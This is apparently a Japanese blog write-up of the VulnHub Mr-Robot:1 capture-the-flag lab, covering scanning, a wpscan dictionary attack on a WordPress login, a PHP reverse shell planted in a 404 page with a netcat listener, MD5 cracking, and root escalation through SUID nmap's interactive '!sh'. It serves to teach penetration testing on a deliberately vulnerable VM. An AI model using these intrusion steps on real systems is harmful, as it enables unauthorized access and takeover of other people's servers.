---
title: Mr Robot CTF Writeup
description: VulnHub Mr-Robot:1 のwriteup．robots.txt と辞書ファイルの探索，WordPress へのログインと PHP リバースシェル，MD5ハッシュの解析，SUID nmap による権限昇格で3つの鍵を入手
date: 2024-03-13 12:00:00 +0900
categories: [CyberSecurity, CTF]
tags: [web, vulnhub]
---

## はじめに

この記事では，vulnhub の mr-robotCTF を攻略していきます．

### 実行環境

- VirtualBox v7.0.8
- Kali Linux 2024.1
- Mr-robot:1 ova

### チャレンジ開始

とりあえず最初はサイト内の探索＆開発者ツールを使用したコードの探索を行います．
サイトにアクセスすると表示されるコマンド群を入力してみましたが，元ネタ？関係の内容が表示されるだけで，特に役に立ちそうな情報は無い．
robot.txt を確認すると下記の表記を見つけたので，/key-1-of-3.txt にアクセスすると，一つ目の flag をゲット!

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

<details>
<summary>key-1-of-3</summary>
073403c8a58a1f80d943455fb30723b9
</details>

気になる辞書ファイルがあるので，/fsocity.dic にアクセスし，ダウンロードしておきます．
次は nmap を使用したポート探索と gobuster を使用したディレクトリ探索を行います．

```zsh
$ nmap -sS -T3 [ip-address] -oN nmap.log
22/tcp closed ssh
80/tcp open http
443/tcp open https
$ gobuster dir -u http://[ip-address] -w /usr/share/wordlists/dirb/common.txt > gobuster.txt
$ cat gobuster.txt
```

![mrrobot_01](/assets/img/ctf/vulnhub/mr_robot_ctf_01.png)

/wp-login が Status:200 で開いているのでアクセスしてみます．
![mrrobot_02](/assets/img/ctf/vulnhub/mr_robot_ctf_02.png)

先ほどダウンロードした fsocity.dic の中身を見てみると，重複している単語があったので，辞書攻撃をやりやすくするために，並び替えと重複単語を削除を行います．
加工した辞書ファイルを passwords に設定し，辞書攻撃を行いましたが，有用な情報は発見できず...

```zsh
$ wc -l fsocity.dic
858160 fsocity.dic
$ sort fsocity.dic | uniq > sorted-fsocity.dic
$ wc -l sorted-fsocity.dic
11451 sorted-fsocity.dic

$ wpscan --url http://[ip-address]/wp-login --passwords sorted-fsocity.dic --usernames admin
```

![mrrobot_03](/assets/img/ctf/vulnhub/mr_robot_ctf_03.png)

ログイン情報がなかなか得られず，かなり時間を取られたのですが/license にアクセスし HTML を見てみると，気になる値があったので base64 decode してみると，ログイン情報が見つかりました．

```html
<pre>
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
do you want a password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
</pre>
```

```zsh
$ echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
elliot:ER28-0652
```

このログイン情報を使用して wp-login にアクセスし，リバースシェルを仕掛けてみます．
今回は pentestmonkey の[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)を 404 ページに仕掛け，netcat を使用し待ち受けます．

```zsh
$ nc -lvnp 1234
```

![mrrobot_04](/assets/img/ctf/vulnhub/mr_robot_ctf_04.png)
リバースシェルが成功し，侵入できたのでシェルの安定化を行います．
password.raw-md5 の内容を CrackStation で解析すると robot のパスワードを入手できたので，ユーザーを切り替え 2 つ目の flag もゲットしました！

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
deamon@linux:/home/robot$ ls
key-2-of-3.txt
password.raw-md5
deamon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
deamon@linux:/home/robot$ su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
```

<details>
<summary>key-2-of-3</summary>
822c73956184f694993bede3eb39f959
</details>

#### 特権昇格

権限昇格できそうな情報を探します．
まずは SUID ビットが設定されている全てのディレクトリを検索すると，
nmap に SUID がセットされているため，GTFOBins を使用して脆弱性を調べます．
nmap の対話型モードを使用した特権昇格が可能みたいなので，この脆弱性を利用すると，無事に特権昇格に成功し，最後の flag を取得できました！

```bash
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap <--
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

robot@linux:/$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

nmap> !sh
# whoami
root

# cd root
# ls
firstboot_done key-3-of-3.txt
# cat key-3-of-3.txt
```

<details>
<summary>key-3-of-3</summary>
04787ddef27c3dee1ee161b21670b4e4
</details>